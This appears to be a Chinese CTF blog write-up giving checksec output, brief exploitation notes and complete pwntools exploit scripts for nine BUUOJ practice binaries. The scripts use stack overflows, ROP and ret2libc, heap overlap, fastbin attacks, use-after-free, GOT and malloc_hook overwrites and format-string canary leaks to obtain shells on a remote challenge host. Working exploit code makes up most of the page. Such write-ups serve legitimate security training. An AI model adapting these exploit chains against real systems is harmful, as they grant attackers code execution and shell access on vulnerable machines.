<h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><h4 id="checksec检查：-16"><a href="#checksec检查：-16" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-19"><a href="#利用：-19" class="headerlink" title="利用："></a>利用：</h4><p>整数溢出造成栈溢出</p>
<h4 id="exp如下：-19"><a href="#exp如下：-19" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;bjdctf_2020_babystack2&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29759)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;bjdctf_2020_babystack2&#39;)</span><br><span class="line"></span><br><span class="line">backdoor&#x3D;0x0000000000400726</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x10+&#39;a&#39;*8+p64(backdoor)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Please input the length of your name:\n&#39;)</span><br><span class="line">sh.sendline(&#39;-1&#39;)</span><br><span class="line">sh.recvuntil(&quot;What&#39;s u name?&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h3><h4 id="checksec检查：-17"><a href="#checksec检查：-17" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-20"><a href="#利用：-20" class="headerlink" title="利用："></a>利用：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( (char *)(v3 + *(_DWORD *)ptr[a1]) &gt;&#x3D; (char *)ptr[a1] - 4 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;my l33t defenses cannot be fooled, cya!&quot;);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>出问题是判断语句，判断内容是description的地址加上要修改（输入）的长度不能覆盖到存放name那个堆块处。</p>
<p>我们可以通过连续申请俩次，再free第一次申请的chunk，再次申请0x80大小的chunk，这也就导致我们距离存放name的chunk有了一个user(description[1]+name[1])的距离.我们就可以通过覆盖name[1]中的description ptr 为free_got来泄露free的libc，然后再将free_got的内容修改为system，我们在free的时候相当于调用system函数。</p>
<p>这里要注意本地偏移和远程不一样。</p>
<h4 id="exp如下：-20"><a href="#exp如下：-20" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;babyfengshui_33c3_2016&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25114)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;babyfengshui_33c3_2016&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(des_size,name,text_size,content):</span><br><span class="line">	sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">	sh.sendline(&#39;0&#39;)</span><br><span class="line">	sh.recvuntil(&#39;size of description: &#39;)</span><br><span class="line">	sh.sendline(str(des_size))</span><br><span class="line">	sh.recvuntil(&#39;name: &#39;)</span><br><span class="line">	sh.sendline(name)</span><br><span class="line">	sh.recvuntil(&#39;text length: &#39;)</span><br><span class="line">	sh.sendline(str(text_size))</span><br><span class="line">	sh.recvuntil(&#39;text: &#39;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">        sh.sendline(&#39;1&#39;)</span><br><span class="line">        sh.recvuntil(&#39;index: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;index: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,text_size,content):</span><br><span class="line">	sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;index: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;text length: &#39;)</span><br><span class="line">        sh.sendline(str(text_size))</span><br><span class="line">        sh.recvuntil(&#39;text: &#39;)</span><br><span class="line">        sh.sendline(content)</span><br><span class="line"></span><br><span class="line">free_got&#x3D;elf.got[&#39;free&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x20,&#39;L0ne1y&#39;,0x20,&#39;A&#39;*0x20) #0</span><br><span class="line">add(0x20,&#39;L0ne1y&#39;,0x20,&#39;A&#39;*0x20) #1</span><br><span class="line">free(0)</span><br><span class="line">add(0x80,&#39;L0ne1y&#39;,0x80,&#39;B&#39;*0x80) #2</span><br><span class="line">edit(2,0x114,&#39;B&#39;*0x80+p32(0)+p32(0x29)+&#39;B&#39;*0x20+p32(0)+p32(0x89)+p32(free_got))</span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;description: &#39;)</span><br><span class="line">free_addr&#x3D;u32(sh.recv(4))</span><br><span class="line">sh.success(&#39;free_addr : &#39; +hex(free_addr))</span><br><span class="line">libc&#x3D;LibcSearcher(&#39;free&#39;,free_addr)</span><br><span class="line">libc_base&#x3D;free_addr-libc.dump(&#39;free&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">sh.success(&#39;system_addr : &#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;&#x2F;bin&#x2F;sh\x00&#39;,0x20,&#39;&#x2F;bin&#x2F;sh\x00&#39;) #3</span><br><span class="line">edit(1,0x4,p32(system_addr))</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="V-amp-N2020-公开赛-simpleHeap"><a href="#V-amp-N2020-公开赛-simpleHeap" class="headerlink" title="[V&amp;N2020 公开赛]simpleHeap"></a>[V&amp;N2020 公开赛]simpleHeap</h3><h4 id="checksec检查：-18"><a href="#checksec检查：-18" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="利用：-21"><a href="#利用：-21" class="headerlink" title="利用："></a>利用：</h4><p>利用Off By One 从而实现chunk extend,继而可以引起堆块重叠,改realloc_hook为one_gadget,改malloc_hook为realloc+offset进行调整栈结构以满足one_gadget利用条件</p>
<h4 id="exp如下：-21"><a href="#exp如下：-21" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;vn_pwn_simpleHeap&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29585)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">        sh.recvuntil(&#39;choice: &#39;)</span><br><span class="line">        sh.sendline(&#39;1&#39;)</span><br><span class="line">        sh.recvuntil(&#39;size?&#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;content:&#39;)</span><br><span class="line">        sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;choice: &#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line">        sh.recvuntil(&#39;idx?&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">        sh.recvuntil(&#39;choice: &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;idx?&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">        sh.recvuntil(&#39;choice: &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;idx?&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;content:&#39;)</span><br><span class="line">        sh.sendline(content)</span><br><span class="line"></span><br><span class="line">add(0x18,&#39;L0ne1y&#39;) #0</span><br><span class="line">add(0x68,&#39;L0ne1y&#39;) #1</span><br><span class="line">add(0x68,&#39;L0ne1y&#39;) #2</span><br><span class="line">add(0x10,&#39;L0ne1y&#39;) #3</span><br><span class="line">edit(0,&#39;a&#39;*0x18+&#39;\xe1&#39;)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x68,&#39;L0ne1y&#39;) #1</span><br><span class="line">show(2)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">one_gadget&#x3D;libc_base+0x4526a</span><br><span class="line">sh.success(&#39;one_agdget : &#39; +hex(one_gadget))</span><br><span class="line">realloc&#x3D;libc_base+libc.symbols[&#39;__libc_realloc&#39;]</span><br><span class="line">sh.success(&#39;realloc : &#39; +hex(realloc))</span><br><span class="line"></span><br><span class="line">fake_chunk&#x3D;malloc_hook-0x23</span><br><span class="line">sh.success(&#39;fake_chunk : &#39; +hex(fake_chunk))</span><br><span class="line">add(0x60,&#39;a&#39;*8) #4</span><br><span class="line">free(3)</span><br><span class="line">free(2)</span><br><span class="line">edit(4,p64(fake_chunk)+&#39;\n&#39;)</span><br><span class="line">add(0x60,&#39;a&#39;*8) #2</span><br><span class="line">add(0x60,&#39;a&#39;*3+&#39;a&#39;*8+p64(one_gadget)+p64(realloc+0xd)+&#39;\n&#39;) #3</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;choice: &#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;size?&#39;)</span><br><span class="line">sh.sendline(&#39;32&#39;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="level3-x64"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</h3><h4 id="checksec检查：-19"><a href="#checksec检查：-19" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-22"><a href="#利用：-22" class="headerlink" title="利用："></a>利用：</h4><p>没啥好说了，干就完了</p>
<h4 id="exp如下：-22"><a href="#exp如下：-22" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;level3_x64&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,28777)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;level3_x64&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">write_got&#x3D;elf.got[&#39;write&#39;]</span><br><span class="line">main_addr&#x3D;elf.symbols[&#39;main&#39;]</span><br><span class="line">pop_rdi&#x3D;0x00000000004006b3</span><br><span class="line">pop_rsi_r15&#x3D;0x00000000004006b1</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x88+p64(pop_rdi)+p64(0x1)+p64(pop_rsi_r15)+p64(write_got)+p64(0)+p64(write_plt)+p64(main_addr)</span><br><span class="line">sh.recvuntil(&#39;Input:\n&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;write_addr : &#39; +hex(write_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">libc_base&#x3D;write_addr-libc.dump(&#39;write&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">bin_addr&#x3D;libc_base+libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x88+p64(pop_rdi)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h3><h4 id="checksec检查：-20"><a href="#checksec检查：-20" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-23"><a href="#利用：-23" class="headerlink" title="利用："></a>利用：</h4><p>程序有现成的后门。其他的利用uaf</p>
<h4 id="exp如下：-23"><a href="#exp如下：-23" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25411)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">magic&#x3D;0x08048945</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;Note size :&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;Content :&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;Index :&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;Index :&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;L0ne1y&#39;) #0</span><br><span class="line">add(0x20,&#39;L0ne1y&#39;) #1</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">add(0x8,p64(magic))</span><br><span class="line">show(1)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h3><h4 id="checksec检查：-21"><a href="#checksec检查：-21" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-24"><a href="#利用：-24" class="headerlink" title="利用："></a>利用：</h4><p>没啥说的</p>
<h4 id="exp如下：-24"><a href="#exp如下：-24" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;PicoCTF_2018_rop_chain&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27742)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;PicoCTF_2018_rop_chain&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">printf_plt&#x3D;elf.plt[&#39;printf&#39;]</span><br><span class="line">printf_got&#x3D;elf.got[&#39;printf&#39;]</span><br><span class="line">format_addr&#x3D;0x080488CD</span><br><span class="line">main_addr&#x3D;0x0804873B</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x18+&#39;a&#39;*4+p32(printf_plt)+p32(main_addr)+p32(format_addr)+p32(printf_got)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Enter your input&gt; &#39;)</span><br><span class="line">printf_addr&#x3D;u32(sh.recv(4))</span><br><span class="line">sh.success(&#39;printf_addr : &#39; +hex(printf_addr))</span><br><span class="line">libc&#x3D;LibcSearcher(&#39;printf&#39;,printf_addr)</span><br><span class="line">libc_base&#x3D;printf_addr-libc.dump(&#39;printf&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">bin_addr&#x3D;libc_base+libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x18+&#39;a&#39;*4+p32(system_addr)+p32(0)+p32(bin_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ZJCTF-2019EasyHeap"><a href="#ZJCTF-2019EasyHeap" class="headerlink" title="ZJCTF 2019EasyHeap"></a>ZJCTF 2019EasyHeap</h3><h4 id="checksec检查：-22"><a href="#checksec检查：-22" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-25"><a href="#利用：-25" class="headerlink" title="利用："></a>利用：</h4><p>edit函数没有检查输入size，可以造成堆溢出，改free_got为system然后free掉就可以了。一开始被程序中的flag骗了，出题人太坏了。</p>
<h4 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下:"></a>exp如下:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;easyheap&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,26756)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;easyheap&#39;)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(str(index))</span><br><span class="line"></span><br><span class="line">fake_chunk&#x3D;0x6020b5</span><br><span class="line">free_got&#x3D;elf.got[&#39;free&#39;]</span><br><span class="line">system_plt&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line">sh.success(&#39;fake_chunk : &#39; +hex(fake_chunk-8))</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;&#x2F;bin&#x2F;sh\x00&#39;) #0</span><br><span class="line">add(0x60,&#39;L0ne1y&#39;) #1</span><br><span class="line">add(0x60,&#39;L0ne1y&#39;) #2</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">edit(0,0x38,&#39;a&#39;*0x20+p64(0)+p64(0x71)+p64(fake_chunk-0x8))</span><br><span class="line">add(0x60,&#39;&#x2F;bin&#x2F;sh\x00&#39;) #1</span><br><span class="line">add(0x60,&#39;b&#39;*3+p64(0)*4+p64(free_got)) #2</span><br><span class="line">edit(0,0x8,p64(system_plt))</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-test-your-memory"><a href="#jarvisoj-test-your-memory" class="headerlink" title="jarvisoj_test_your_memory"></a>jarvisoj_test_your_memory</h3><h4 id="checksec检查：-23"><a href="#checksec检查：-23" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-26"><a href="#利用：-26" class="headerlink" title="利用："></a>利用：</h4><p>需要注意返回地址随便写个无效地址会出现读不出来flag的问题</p>
<h4 id="exp如下-1"><a href="#exp如下-1" class="headerlink" title="exp如下:"></a>exp如下:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;memory&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25417)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;memory&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">flag_addr&#x3D;0x080487E0</span><br><span class="line">system_plt&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line">main_addr&#x3D;0x08048677</span><br><span class="line"></span><br><span class="line">#sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x13+&#39;a&#39;*4+p32(system_plt)+p32(main_addr)+p32(flag_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h3><h4 id="checksec检查：-24"><a href="#checksec检查：-24" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-27"><a href="#利用：-27" class="headerlink" title="利用："></a>利用：</h4><p>格式化字符串泄露canary，然后栈溢出</p>
<h4 id="exp如下：-25"><a href="#exp如下：-25" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;bjdctf_2020_babyrop2&#39;)</span><br><span class="line">p&#x3D;remote(&#39;node3.buuoj.cn&#39;,26807)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;bjdctf_2020_babyrop2&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload &#x3D; &#39;%7$p&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;0x&#39;)</span><br><span class="line">cancry &#x3D; int(p.recv(16),16)</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; 0x0400610</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">pop_rdi &#x3D; 0x0400993</span><br><span class="line">main_addr &#x3D; elf.symbols[&#39;main&#39;]</span><br><span class="line">ret_addr &#x3D; 0x0400887</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">payload &#x3D; p64(cancry)</span><br><span class="line">payload &#x3D; payload.rjust(0x20,&#39;a&#39;)</span><br><span class="line">payload +&#x3D; &#39;bbbbbbbb&#39;</span><br><span class="line">payload +&#x3D; p64(pop_rdi)</span><br><span class="line">payload +&#x3D; p64(puts_got)</span><br><span class="line">payload +&#x3D; p64(puts_plt)</span><br><span class="line">payload +&#x3D; p64(ret_addr)</span><br><span class="line">p.recvuntil(&#39;story!\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr &#x3D; u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">base_addr &#x3D; puts_addr - 0x06f690</span><br><span class="line">shell_addr &#x3D; base_addr + 0x45216</span><br><span class="line">p.recvuntil(&#39;story!\n&#39;)</span><br><span class="line">payload &#x3D; p64(cancry)</span><br><span class="line">payload &#x3D; payload.rjust(0x20,&#39;a&#39;)</span><br><span class="line">payload +&#x3D; &#39;bbbbbbbb&#39;</span><br><span class="line">payload +&#x3D; p64(shell_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

